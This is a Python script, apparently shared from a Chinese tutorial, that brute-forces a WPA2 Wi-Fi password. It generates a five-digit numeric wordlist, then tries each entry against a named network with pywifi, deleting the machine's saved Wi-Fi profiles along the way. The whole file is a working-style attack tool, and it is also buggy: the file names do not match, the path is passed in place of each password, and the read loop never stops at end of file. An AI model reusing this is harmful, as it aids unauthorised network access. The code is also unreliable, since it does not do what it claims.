# -*- coding:utf-8 -*-
# @Time   :2019/5/22 15:49
# @File   :myWifi.py
# @Author :Vsonli
import itertools as its
import pywifi
from pywifi import const
import time

#链接地址：https://mp.weixin.qq.com/s/lnkJqtATDb4bvpVv49mnVA

def my_password():
    '''该密码本是我们常用的密码，一般数字、字母和符号组成，用穷举法生成一个简单的密码本，库为itertools
        通过该密码本无穷推出各种组合结果，然后去破解wifi
    '''
    #迭代器，就是密码的组合
    words = '1234567890'
    #生成密码本的位数，五位数，repeat=5
    r = its.product(words,repeat=5)
    #保存在文件中，追加
    dic = open('paaword.word','a')
    #i是元祖
    for i in r:
        #join空格链接
        dic.write("".join(i))
        dic.write("".join("\n"))
        print(i)
    dic.close()
    print('密码文本已生成')


def wifi_connect(pwd):
    '''测试连接，返回连接结果'''
    #抓取网卡接口
    wifi = pywifi.PyWiFi()
    #获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    #断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        #创建wifi连接文件
        profile = pywifi.Profile()
        #要连接wifi的名称
        profile.ssid = '名称'
        #网卡的开房状态
        profile.auth = const.AUTH_ALG_OPEN
        #wifi加密算法，一般wifi加密算法为wps
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        #调用密码
        profile.key = pwd
        #删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        #设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        #wifi连接时间
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print('已有wifi连接')

def read_password():
    '''读取密码本'''
    print('开始破解')
    #密码本路径
    path = 'password.txt'
    #打开文件
    file = open(path,'r')
    while True:
        try:
            #一行一行读取
            pad = file.readline()
            bool = wifi_connect(path)

            if bool:
                print('密码已破解：',pad)
                print('wifi已自动连接....')
                break
            else:
                #跳出当前循环，进入下一次循环
                print('密码破解中....密码校对：',pad)
        except:
            continue

my_password()
read_password()